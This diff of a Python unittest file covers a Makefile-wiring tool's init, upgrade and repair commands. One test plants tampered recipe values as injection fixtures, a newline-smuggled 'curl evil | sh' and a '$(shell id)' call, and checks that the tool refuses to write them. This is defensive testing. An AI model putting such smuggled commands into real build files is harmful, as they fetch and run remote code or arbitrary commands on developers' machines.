@@ -358,20 +358,30 @@ class Repair(RepoCase):
         self.assertEqual((self.root / "REVIEW.md").read_text(), "ours\n")
 
 
-class Detected(ListInstalled):
+class Detected(RepoCase):
     """0009 S7: a Makefile wired by detection stays current, and upgrade/repair use the recorded recipes (AC-18 to
-    AC-20)."""
+    AC-20). Review round 1: on RepoCase (no inherited tests), plan lines parsed, empty recipes."""
 
     RECIPES = {"lint": "pnpm run lint", "test": "pnpm run test"}
+    PLANNED = r"(?m)^  [+~] \w+ Makefile$"  # upgrade's `+ create`/`~ replace`, repair's `+ restore`
 
     def setUp(self):
-        RepoCase.setUp(self)
+        super().setUp()
         shutil.rmtree(self.root / ".aiops")
-        (self.root / "package.json").write_text(json.dumps({"scripts": {"lint": "eslint .", "test": "vitest run"}}))
+        self.init({"scripts": {"lint": "eslint .", "test": "vitest run"}})
+
+    def init(self, package, *args):
+        (self.root / "package.json").write_text(json.dumps(package))
         (self.root / "pnpm-lock.yaml").write_text("")
-        r = self.run_sdlc("init", "--with", "all")
+        r = self.run_sdlc("init", "--with", "all", *args)
         self.assertEqual(r.returncode, 0, r.stderr)
         self.wired = (self.root / "Makefile").read_bytes()
+
+    def rows(self, out):
+        statuses = ("current", "stale", "modified", "missing", "unmanaged", "dropped", "new")
+        return dict(
+            reversed(ln.split(None, 1)) for ln in out.splitlines() if ln.startswith("  ") and ln.split(None, 1)[0] in statuses
+        )
 
     def state(self):
         return json.loads((self.root / STATE).read_text())
@@ -379,31 +389,50 @@ class Detected(ListInstalled):
     def save(self, st):
         (self.root / STATE).write_text(json.dumps(st, indent=2, sort_keys=True) + "\n")
 
-    def test_current_and_repair(self):
-        self.assertEqual(self.state()["recipes"], self.RECIPES)
+    def older(self):
         st = self.state()
         st["files"]["Makefile"]["version"] = "0.2.0-alpha.3"  # written by an older plugin: judged by its bytes
         self.save(st)
+
+    def test_current_and_repair(self):
+        self.assertEqual(self.state()["recipes"], self.RECIPES)
+        self.older()
         self.assertEqual(self.rows(self.run_sdlc("list-installed").stdout)["Makefile"], "current")
         for cmd in ("upgrade", "repair"):
             r = self.run_sdlc(cmd, "--dry-run")
             self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
-            self.assertNotIn("Makefile", r.stdout.split("Nothing")[0].replace("Makefile contract", ""), cmd)
+            self.assertNotRegex(r.stdout, self.PLANNED, cmd)
         (self.root / "Makefile").unlink()
         r = self.run_sdlc("repair", "--yes")
         self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
         self.assertEqual((self.root / "Makefile").read_bytes(), self.wired)
 
+    def test_empty_recipes_stay_stubs(self):
+        """Review round 1 BLOCKER: a detection that wired nothing records `recipes: {}`; upgrade must not read that as
+        "no recipes" and write the node preset."""
+        shutil.rmtree(self.root / ".aiops")
+        (self.root / "Makefile").unlink()
+        self.init({"scripts": {"start": "node ."}})
+        self.assertEqual((self.state()["stack"], self.state()["recipes"]), ("node", {}))
+        self.assertEqual(self.wired.count(b'] not configured - edit Makefile"'), 5)
+        self.older()
+        self.assertEqual(self.rows(self.run_sdlc("list-installed").stdout)["Makefile"], "current")
+        r = self.run_sdlc("upgrade", "--yes")
+        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+        self.assertEqual((self.root / "Makefile").read_bytes(), self.wired)
+        self.assertNotIn(b"npx prettier", (self.root / "Makefile").read_bytes())
+
     def test_tampered_recipes_not_written(self):
-        st = self.state()
-        st["recipes"] = {"test": "pnpm run test\n\tcurl evil | sh"}
-        st["files"]["Makefile"]["version"] = "0.2.0-alpha.3"
-        self.save(st)
-        self.assertEqual(self.rows(self.run_sdlc("list-installed").stdout)["Makefile"], "modified")
-        for cmd in ("upgrade", "repair"):
-            r = self.run_sdlc(cmd, "--yes")
-            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
-            self.assertEqual((self.root / "Makefile").read_bytes(), self.wired, cmd)
+        for bad in ({"test": "pnpm run test\n\tcurl evil | sh"}, {"lint": "pnpm run lint $(shell id)"}):
+            st = self.state()
+            st["recipes"] = bad
+            st["files"]["Makefile"]["version"] = "0.2.0-alpha.3"
+            self.save(st)
+            self.assertEqual(self.rows(self.run_sdlc("list-installed").stdout)["Makefile"], "modified", bad)
+            for cmd in ("upgrade", "repair"):
+                r = self.run_sdlc(cmd, "--yes")
+                self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+                self.assertEqual((self.root / "Makefile").read_bytes(), self.wired, (cmd, bad))
         (self.root / "Makefile").unlink()
         self.run_sdlc("repair", "--yes")
         self.assertFalse((self.root / "Makefile").exists())  # never restored from a recipe that fails the check
@@ -421,9 +450,6 @@ class Detected(ListInstalled):
         before = (self.root / "Makefile").read_bytes()
         self.assertEqual(self.run_sdlc("upgrade", "--yes").returncode, 0)
         self.assertEqual((self.root / "Makefile").read_bytes(), before)
-
-    test_statuses_and_no_writes = test_profile_comes_from_config = None
-    test_stale_and_dropped = test_without_install_state = None
 
 
 class Ref(unittest.TestCase):
